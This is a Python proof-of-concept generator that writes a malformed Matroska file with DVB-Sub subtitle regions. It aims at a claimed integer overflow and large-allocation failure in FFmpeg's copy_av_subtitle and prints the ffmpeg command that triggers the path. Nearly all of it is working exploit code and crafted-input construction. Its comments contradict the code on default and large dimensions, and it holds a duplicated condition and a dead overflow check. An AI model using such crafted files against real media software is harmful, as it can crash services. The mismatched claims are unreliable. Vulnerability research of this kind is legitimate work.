#!/usr/bin/env python3
"""
PoC generator for VULN-001: copy_av_subtitle integer overflow
in fftools/ffmpeg_dec.c copy_av_subtitle() lines 503-514.

Vulnerability: buf_size = src_rect->h * src_rect->linesize[j]
where both are int. When the int product overflows signed 32-bit
and wraps to a small positive value, av_memdup underallocates.

For SUBTITLE_BITMAP (PAL8), linesize = width, so:
  h * linesize = h * width  (same product as original allocation)

The overflow requires h*linesize > INT_MAX. For that to be
achievable while original allocation succeeds:
  - The decode must not reject the dimensions
  - DVB-Sub uses av_image_check_size2 which checks (w+1024)*(h+128) < INT_MAX
    and w*h < INT_MAX (max_pixels=INT_MAX default).

With max dimensions passing the stride check (w=h~45000):
  h*linesize = 45000*45000 = 2,025,000,000 < INT_MAX -> no signed overflow
  but a very large allocation that may fail -> NULL ptr path.

True overflow path (h*linesize wraps to small positive, causing underallocation):
  Requires h*width > INT_MAX. But the size check prevents w*h > INT_MAX.
  However the intermediate int overflow in the SECOND dvbsub check:
    region->width * region->height * 2 > 320*1024*8 (2,621,440)
  uses int arithmetic. If w*h < INT_MAX but w*h*2 overflows to negative:
    - w*h in range (1,073,741,824, INT_MAX) -> w*h*2 overflows to negative
    - Negative < 2,621,440 -> second check BYPASSED (wrongly passes)
  Then buf_size = region->buf_size = region->width * region->height
  This is still < INT_MAX (no overflow in copy_av_subtitle itself).

Key finding: the dvbsub decoder's av_image_check_size2 prevents the direct
overflow in copy_av_subtitle for the pixel data plane. The vulnerability is
real in code but requires either:
  (a) A subtitle codec without such guards (or with overflow in its own check)
  (b) A sufficiently large h and linesize that the OS allows ~2GB allocation

This PoC crafts an MKV with DVB-Sub that targets the maximum credible
dimensions while trying to trigger the fix_sub_duration_heartbeat path.
It documents the behavior for CVE analysis.

Usage: python3 vuln_001_gen.py [--large]
  default: small (100x100) dims to confirm code path reachability
  --large:  maximum dims (~32768x64) to maximally stress the path

Output: vuln_001_input.mkv
"""
import struct
import sys


def encode_vint_size(size):
    """Encode EBML data size as VINT."""
    if size < 0:
        return b'\x01\xff\xff\xff\xff\xff\xff\xff'
    if size <= 0x7E:
        return bytes([0x80 | size])
    elif size <= 0x3FFE:
        return struct.pack('>H', 0x4000 | size)
    elif size <= 0x1FFFFE:
        b = struct.pack('>I', 0x200000 | size)
        return b[1:]
    elif size <= 0x0FFFFFFE:
        return struct.pack('>I', 0x10000000 | size)
    else:
        return struct.pack('>Q', 0x0100000000000000 | size)


def ebml_uint(id_bytes, value):
    if value == 0:
        data = b'\x00'
    elif value <= 0xFF:
        data = bytes([value])
    elif value <= 0xFFFF:
        data = struct.pack('>H', value)
    elif value <= 0xFFFFFF:
        data = struct.pack('>I', value)[1:]
    elif value <= 0xFFFFFFFF:
        data = struct.pack('>I', value)
    elif value <= 0xFFFFFFFFFF:
        data = struct.pack('>Q', value)[3:]
    elif value <= 0xFFFFFFFFFF:
        data = struct.pack('>Q', value)[2:]
    elif value <= 0xFFFFFFFFFFFFFF:
        data = struct.pack('>Q', value)[1:]
    else:
        data = struct.pack('>Q', value)
    return id_bytes + encode_vint_size(len(data)) + data


def ebml_float64(id_bytes, value):
    data = struct.pack('>d', value)
    return id_bytes + encode_vint_size(len(data)) + data


def ebml_string(id_bytes, s):
    data = s.encode('utf-8')
    return id_bytes + encode_vint_size(len(data)) + data


def ebml_binary(id_bytes, data):
    return id_bytes + encode_vint_size(len(data)) + data


def ebml_container(id_bytes, *children):
    data = b''.join(children)
    return id_bytes + encode_vint_size(len(data)) + data


# EBML element IDs
ID_EBML              = b'\x1A\x45\xDF\xA3'
ID_EBMLVersion       = b'\x42\x86'
ID_EBMLReadVersion   = b'\x42\xF7'
ID_EBMLMaxIDLength   = b'\x42\xF2'
ID_EBMLMaxSizeLength = b'\x42\xF3'
ID_DocType           = b'\x42\x82'
ID_DocTypeVersion    = b'\x42\x87'
ID_DocTypeReadVersion= b'\x42\x85'

ID_Segment           = b'\x18\x53\x80\x67'
ID_Info              = b'\x15\x49\xA9\x66'
ID_TimestampScale    = b'\x2A\xD7\xB1'
ID_MuxingApp         = b'\x4D\x80'
ID_WritingApp        = b'\x57\x41'
ID_Duration          = b'\x44\x89'

ID_Tracks            = b'\x16\x54\xAE\x6B'
ID_TrackEntry        = b'\xAE'
ID_TrackNumber       = b'\xD7'
ID_TrackUID          = b'\x73\xC5'
ID_TrackType         = b'\x83'
ID_CodecID           = b'\x86'
ID_CodecPrivate      = b'\x63\xA2'
ID_DefaultDuration   = b'\x23\xE3\x83'
ID_Video             = b'\xE0'
ID_PixelWidth        = b'\xB0'
ID_PixelHeight       = b'\xBA'

ID_Cluster           = b'\x1F\x43\xB6\x75'
ID_Timestamp         = b'\xE7'
ID_SimpleBlock       = b'\xA3'


def make_simple_block(track_num, timestamp_ms, keyframe, payload):
    if track_num <= 126:
        track_vint = bytes([0x80 | track_num])
    else:
        track_vint = struct.pack('>H', 0x4000 | track_num)
    flags = 0x80 if keyframe else 0x00
    block_data = track_vint + struct.pack('>h', timestamp_ms) + bytes([flags]) + payload
    return ID_SimpleBlock + encode_vint_size(len(block_data)) + block_data


def make_dvbsub_display_set(region_w, region_h, version=0):
    """
    Build a minimal DVB-Sub display set with given region dimensions.

    IMPORTANT: The dvbsub decoder at dvbsubdec.c line 1318 skips a packet
    if the page_version_number equals the previously seen version:
        if (ctx->version == version) return 0;
    So each new display set MUST have a different version number.

    The dvbsub decoder checks:
      1. av_image_check_size2(w, h, INT_MAX, PAL8) -> fails if h*w >= INT_MAX
         or if (w+1024)*(h+128) >= INT_MAX
      2. w*h*2 > 2621440 (using int arithmetic, can overflow)

    For maximum stress, pass region_w and region_h from the analysis above.
    For a simple reachability test, use small values like 100x100.
    """
    page_id = 1

    def seg(stype, data):
        return bytes([0x0F, stype]) + struct.pack('>HH', page_id, len(data)) + data

    # --- Page Composition Segment (0x10) ---
    # page_time_out=255, page_version=<version>, page_state=0 (normal update)
    # One region: region_id=1 at position (0,0)
    pcs = bytes([
        255,                          # page_time_out (seconds) - long duration
        (version & 0xF) << 4,         # page_version_number(4b) | page_state(2b=00) | reserved(2b)
        # region list entry:
        1,              # region_id
        0x00,           # reserved
    ]) + struct.pack('>HH', 0, 0)  # region_horizontal_pos, region_vertical_pos

    # --- Region Composition Segment (0x11) ---
    rcs = bytes([
        1,              # region_id
        0b00000000,     # region_version_number(4b) | region_fill_flag(1b) | reserved(3b)
    ])
    rcs += struct.pack('>HH', region_w, region_h)  # region_width, region_height
    # According to dvbsubdec.c parsing (lines 1218-1234):
    #   depth_byte -> region_depth
    #   clut_id_byte
    #   for depth==8: bgcolor_byte, skip_byte
    # Then object list starts.
    rcs += bytes([
        0b00101100,     # region_level_of_compatibility(3b=001) | region_depth(3b=011=8bpp) | reserved(2b)
        0,              # region_CLUT_id
        0,              # region_8_bit_pixel_code (background color index, consumed for depth==8)
        0b00000000,     # skipped byte (buf += 1 in decoder for depth==8)
    ])
    # One composition object at (0,0) - parsed by while (buf + 5 < buf_end) loop
    # Per code lines 1247-1274: reads object_id(2), type+x_pos(2), y_pos(2)
    rcs += struct.pack('>H', 1)   # object_id = 1
    rcs += bytes([
        0b00000000,     # object_type(2b)=0 | object_provider_flag(2b)=0 | x_pos[11:8](4b)=0
        0,              # x_pos[7:0] = 0
        0b00000000,     # [1b reserved] | [3b reserved] | y_pos[11:8](4b)=0
        0,              # y_pos[7:0] = 0
    ])

    # --- CLUT Definition Segment (0x12) ---
    # CLUT_id=0 with two 8-bit entries
    clut = bytes([
        0,              # CLUT_id
        0b00000000,     # CLUT_version_number(4b) | reserved(4b)
    ])
    # entry 0: transparent black
    clut += bytes([0x00, 0b10000000, 16, 128, 128, 255])
    # entry 1: white opaque
    clut += bytes([0x01, 0b10000000, 235, 128, 128, 0])

    # --- Object Data Segment (0x13) ---
    # object_id=1, 8-bit pixel coding, minimal data
    # Only emit enough pixels for 1 row (1 end-of-line code)
    # The decoder will fill the rest with the background color
    pixel_data_top = bytes([0xF0])  # end_of_object_line_code
    ods = struct.pack('>H', 1)      # object_id
    # ONE combined byte: object_version_number(4b) | object_coding_method(2b) | non_modifying_colour_flag(1b) | reserved(1b)
    # coding_method=0 (run-length encoded pixels), non_modifying=0
    ods += bytes([0b00000000])      # version=0, coding=0, non_mod=0, reserved=0
    ods += struct.pack('>H', len(pixel_data_top))  # top_field_data_block_length
    ods += struct.pack('>H', 0)                    # bottom_field_data_block_length
    ods += pixel_data_top

    # --- End of Display Set (0x80) ---
    eds = b''

    return (seg(0x10, pcs) + seg(0x11, rcs) + seg(0x12, clut) +
            seg(0x13, ods) + seg(0x80, eds))


def build_mkv(region_w, region_h):
    """Assemble the complete MKV file."""
    dvbsub_priv = struct.pack('>HH', 1, 1)  # page_id=1, ancillary_page_id=1

    ebml_header = ebml_container(
        ID_EBML,
        ebml_uint(ID_EBMLVersion, 1),
        ebml_uint(ID_EBMLReadVersion, 1),
        ebml_uint(ID_EBMLMaxIDLength, 4),
        ebml_uint(ID_EBMLMaxSizeLength, 8),
        ebml_string(ID_DocType, 'matroska'),
        ebml_uint(ID_DocTypeVersion, 4),
        ebml_uint(ID_DocTypeReadVersion, 2),
    )

    info = ebml_container(
        ID_Info,
        ebml_uint(ID_TimestampScale, 1000000),
        ebml_string(ID_MuxingApp, 'vuln001_poc'),
        ebml_string(ID_WritingApp, 'vuln001_poc'),
        ebml_float64(ID_Duration, 10000.0),
    )

    # Placeholder video track - lavfi will provide real video
    video_track = ebml_container(
        ID_TrackEntry,
        ebml_uint(ID_TrackNumber, 1),
        ebml_uint(ID_TrackUID, 1111),
        ebml_uint(ID_TrackType, 1),
        ebml_string(ID_CodecID, 'V_VP8'),
        ebml_uint(ID_DefaultDuration, 33333333),
        ebml_container(
            ID_Video,
            ebml_uint(ID_PixelWidth, 320),
            ebml_uint(ID_PixelHeight, 240),
        ),
    )

    sub_track = ebml_container(
        ID_TrackEntry,
        ebml_uint(ID_TrackNumber, 2),
        ebml_uint(ID_TrackUID, 2222),
        ebml_uint(ID_TrackType, 17),
        ebml_string(ID_CodecID, 'S_DVBSUB'),
        ebml_binary(ID_CodecPrivate, dvbsub_priv),
    )

    tracks = ebml_container(ID_Tracks, video_track, sub_track)

    # Two subtitle display sets at t=0 and t=2000ms, with DIFFERENT versions.
    #
    # The dvbsub decoder (dvbsubdec.c line 1318) ignores a packet whose
    # page_version_number equals the previously decoded version:
    #   if (ctx->version == version) return 0;
    # So packet 1 uses version=0 and packet 2 uses version=1.
    #
    # With compute_edt=1 (forced by ffmpeg for OST transcoding, ist_use() line 1162):
    # - Packet 1 (version=0): save_subtitle_set() called but prev_start=AV_NOPTS_VALUE
    #   -> got_output=0, sets ctx->version=0
    # - Packet 2 (version=1): save_subtitle_set() called, prev_start=pts_of_pkt1=0
    #   -> got_output=1! The FIRST subtitle is output with end_time computed.
    # - EOF/flush: transcode_subtitles(NULL) flushes; returns AVERROR_EOF
    #
    # NOTE: avcodec_decode_subtitle2() does NOT use the codec parser.
    # It passes the packet directly to the decoder's decode() callback.
    # dvbsubdec.c line 1478 checks: if (*buf != 0x0f) -> AVERROR_INVALIDDATA.
    # MKV stores raw DVB-Sub segments starting with 0x0F (sync byte) directly.
    # NO 0x20 0x00 PES header prefix is needed or wanted here.
    dvbsub_payload1 = make_dvbsub_display_set(region_w, region_h, version=0)
    dvbsub_payload2 = make_dvbsub_display_set(region_w, region_h, version=1)

    cluster = ebml_container(
        ID_Cluster,
        ebml_uint(ID_Timestamp, 0),
        make_simple_block(2, 0, True, dvbsub_payload1),
        make_simple_block(2, 2000, True, dvbsub_payload2),
    )

    segment_body = info + tracks + cluster
    segment = ID_Segment + b'\x01\xff\xff\xff\xff\xff\xff\xff' + segment_body
    return ebml_header + segment


if __name__ == '__main__':
    # Default: maximum dimensions that TARGET the int32 boundary
    # The dvbsub decoder checks (w+1024)*(h+128) < INT_MAX
    # and w*h < INT_MAX (max_pixels=INT_MAX).
    #
    # For w=h=45000: (46024)*(45128) = 2,076,971,072 < INT_MAX ✓
    #                w*h = 2,025,000,000 < INT_MAX ✓
    # After decode: h=45000, linesize[0]=45000
    # copy_av_subtitle: buf_size = 45000*45000 = 2,025,000,000 (int32, no overflow)
    # av_memdup tries to alloc 2GB -> likely fails on most systems -> NULL ptr path
    #
    # ACTUAL INT32 OVERFLOW PATH:
    # For w=46341, h=46341: w*h = 2,147,489,481 > INT_MAX -> rejected by av_image_check_size2
    # So pure int32 overflow in copy_av_subtitle is prevented for DVB-Sub.
    #
    # The PoC demonstrates: the code path IS reachable (fix_sub_duration_heartbeat
    # calls copy_av_subtitle), and with sufficient dimensions, the allocation
    # fails causing AVERROR(ENOMEM) propagation through the heartbeat path.

    large = '--large' in sys.argv

    if large:
        # Maximum dimensions (approx) that pass the dvbsub size checks:
        # w*h should be just under INT_MAX and (w+1024)*(h+128) < INT_MAX
        # w=32767, h=65504: w*h=2,146,926,528 < INT_MAX
        #   stride=(32767+1024)=33791; check: 33791*(65504+128)=33791*65632=2,218,296,512 > INT_MAX -> fails
        # w=32767, h=40000: w*h=1,310,680,000
        #   stride=33791; check: 33791*(40000+128)=33791*40128=1,355,484,448 < INT_MAX -> OK
        #   w*h*2=2,621,360,000 -> int32 overflows to -1,673,607,296 -> NOT > 2,621,440 -> second check bypassed
        # So dimensions 32767x40000 should pass the dvbsub decoder.
        # h*linesize = 40000*32767 = 1,310,680,000 < INT_MAX -> no signed overflow in copy_av_subtitle
        # But 1.25 GB allocation, likely fails -> NULL ptr dereference when result is used
        region_w = 32767   # 16-bit max: 65535; use 32767 as max for stride check
        region_h = 40000
    else:
        # Small dimensions for initial reachability testing
        region_w = 200
        region_h = 200

    data = build_mkv(region_w, region_h)
    out = 'vuln_001_input.mkv'
    with open(out, 'wb') as f:
        f.write(data)

    import os
    print(f'[+] Written {out} ({os.path.getsize(out)} bytes)')
    print(f'[+] DVB-Sub region dimensions: {region_w} x {region_h}')

    product = region_w * region_h
    if product < 0:  # would overflow in C too
        print(f'[+] h*linesize as int32: OVERFLOW (wraps to {product & 0xFFFFFFFF})')
    else:
        print(f'[+] h*linesize product: {product} ({product/(1024**3):.2f} GB)')
        if product > 2**31 - 1:
            print(f'[!] INT32 OVERFLOW: product {product} > INT_MAX {2**31-1}')
            print(f'[!] As int32: {product - 2**32}')
        else:
            print(f'[-] No int32 overflow (product < INT_MAX)')

    print(f'[+] Command: ffmpeg -y -f lavfi -i "color=black:320x240:rate=1:duration=5" '
          f'-fix_sub_duration -i {out} -map 0:v -map 1:s '
          f'-c:v mpeg2video -c:s dvbsub -fix_sub_duration_heartbeat '
          f'-f mpegts /dev/null')
